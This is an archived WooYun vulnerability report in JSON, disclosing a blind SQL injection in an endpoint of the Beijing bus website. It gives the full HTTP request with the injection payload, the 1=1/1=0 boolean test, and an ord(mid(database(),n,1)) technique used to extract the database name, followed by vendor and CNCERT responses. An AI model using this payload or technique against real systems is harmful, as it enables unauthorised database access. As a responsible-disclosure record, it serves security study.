{"id": 54444, "wybug_id": "wooyun-2014-064365", "wybug_title": "北京公交网SQL盲注", "wybug_corp": "北京公交网", "wybug_author": "luk1se", "wybug_date": "2014-06-10 18:15", "wybug_open_date": "2014-07-25 18:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向公众公开  简要描述： 已经过滤了<>等符号，sql盲注是由于双字节编码导致，可获取数据库信息等 详细说明：  www.bjbus.com:80\nGET /ajax_load/ajax_check_member_id.php?uUserID=admin%5d'%20or%201=1%23 HTTP/1.1Host: www.bjbus.comProxy-Connection: keep-aliveAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36Referer: http://www.bjbus.com/home/member_add.php?uNew=NewAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Content-Length: 2\n分别提交1=1、1=0返回结果不一样\nuUserID=admin%5d'%20or%201=1%23uUserID=admin%5d'%20or%201=0%23\n使用ord(mid(database(),n,1))=m，获取到第1到5位的ASCII值为100、98、95、103、106，即数据库名为：db_gj   漏洞证明：  1=1时，\n\n1=0时，\n\n获取数据库名，\n\n   修复方案：  修复双字节问题   版权声明：转载请注明来源 luk1se@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-06-14 23:05 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT按以往处置渠道通报给北京市信息化主管部门，由其后续联系网站管理单位 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}